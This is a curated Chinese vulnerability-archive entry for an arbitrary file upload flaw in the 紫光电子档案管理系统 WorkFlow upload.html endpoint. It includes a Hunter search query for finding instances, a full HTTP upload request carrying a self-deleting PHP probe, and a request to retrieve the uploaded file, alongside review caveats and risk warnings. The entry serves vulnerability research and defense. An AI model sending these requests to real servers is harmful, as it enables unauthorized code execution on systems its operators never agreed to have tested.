---
source: "wy876 漏洞文库"
title: "紫光电子档案管理系统 WorkFlow upload.html文件上传"
product: "紫光电子档案管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，有效token条件/执行路径未知"
prerequisites: "请求令牌，后续GET含会话"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/qgnm98f455xygfw3"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FWorkFlow%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
hunter: "app.name=\"紫光档案管理系统\""
id: "vw-af700a6f758a4a489a59b227"
entity_id: "ve-af700a6f758a4a489a59b227"
schema_version: "1"
previous_fofa_unverified: "app.name="
---

# 紫光电子档案管理系统 WorkFlow upload.html文件上传

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：紫光电子档案管理系统；WorkFlow upload.html文件上传
- 版本、配置及部署条件：未知版本，有效token条件/执行路径未知
- 认证与权限前提：请求令牌，后续GET含会话
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与496共享URL固定token但入口和字段不同，勿未经源码即判一漏洞
- 取回路径含固定20240220/随机名，必须来自本次响应，文中无返回
- PHP输出后自删除影响复测；静态令牌/Cookie和Content-Length不可照搬
- 无匿名证明、修复和范围；Hunter错填fofa

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
紫光电子档案管理系统是一款专业的电子档案管理软件，旨在帮助企业实现高效、便捷的档案管理。系统具有强大的文件存储、检索和共享功能，能够提供全面的档案管理解决方案。同时，紫光电子档案管理系统还拥有智能化的分类和归档功能，可以自动识别文件类型和属性，实现快速分类和高效管理。用户只需简单操作，就能轻松实现对各类电子档案的整理、查询和备份，极大提升了工作效率和信息安全性。紫光档案管理系统WorkFlow存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 紫光档案管理系统

## 三、资产测绘
+ hunter`app.name="紫光档案管理系统"`
+ 特征


## 四、漏洞复现
```http
POST /System/WorkFlow/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Connection: close
Content-Length: 566
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=vow8ojiofbpypwih3t3i

--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="userID"

admin
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="fondsid"

1
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="comid"

1
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="token"

affe447f075bac53a7e568e833391e67
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="Filedata"; filename="wizjbifuta.php"
Content-Type: multipart/form-data


<?php echo "2ccASC47CJ474cqTBuzA0q6FCAS";unlink(__FILE__); ?>
--vow8ojiofbpypwih3t3i--
```

> 请求长度说明：原资料 Content-Length 为 566；保留原始标头；其数值未据实际请求体重新计算或验证。


上传文件位置

```http
GET /tmp/System/WorkFlow/import/20240220/65d41fbc77b27.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: close
Accept: text/*
Cookie: PHPSESSID=d3dbba517d0d6ff544f1be11e134a7f9
Accept-Encoding: gzip, deflate
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qgnm98f455xygfw3>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
